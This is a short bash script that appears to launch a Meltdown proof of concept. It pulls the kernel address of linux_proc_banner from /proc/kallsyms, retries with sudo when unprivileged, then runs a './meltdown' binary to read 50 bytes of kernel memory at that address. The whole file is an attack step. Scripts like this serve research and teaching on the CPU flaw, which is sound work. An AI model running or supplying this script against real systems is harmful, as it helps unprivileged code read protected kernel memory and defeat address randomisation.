#！/bin/bash

a=$(sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p' /proc/kallsyms)
if [ -z $a ];then
    echo "Need root to get the address!"
    a=$(sudo sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p' /proc/kallsyms)
fi
echo "Attack address="$a
./meltdown $a 50
